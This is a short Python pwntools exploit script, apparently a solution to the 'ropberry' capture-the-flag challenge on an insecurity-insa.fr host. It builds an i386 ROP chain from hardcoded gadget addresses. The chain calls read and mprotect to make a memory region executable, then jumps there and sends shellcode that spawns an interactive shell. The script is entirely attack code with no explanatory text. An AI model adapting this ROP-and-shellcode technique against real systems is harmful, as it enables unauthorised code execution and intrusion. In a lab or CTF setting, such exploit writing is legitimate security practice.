from pwn import *

context.arch='i386'
#p=process('./ropberry')
#p=ssh(host='ropberry.ctf.insecurity-insa.fr',user='user',keyfile='../x.pem',port=2226)
p=process(['ssh','-i','../x.pem','-p','2226','user@ropberry.ctf.insecurity-insa.fr'])

pr = 0x08049a83
ppr = 0x08075b22
pppr = 0x0805690b
pop_eax = 0x080c1906
jmp_eax = 0x0804a7e7
mprotect = 0x8058d40
read = 0x80580d0
addr = 0x80ed500

pay='A'*8
pay += p32(read)+p32(pppr)+p32(0)+p32(addr)+p32(0x100)
pay += p32(mprotect)+p32(pppr)+p32(addr-0x500)+p32(0x1000)+p32(7)
pay += p32(pop_eax)+p32(addr)+p32(jmp_eax)

p.sendlineafter('president',pay)
p.send(asm(shellcraft.sh()))
p.interactive()
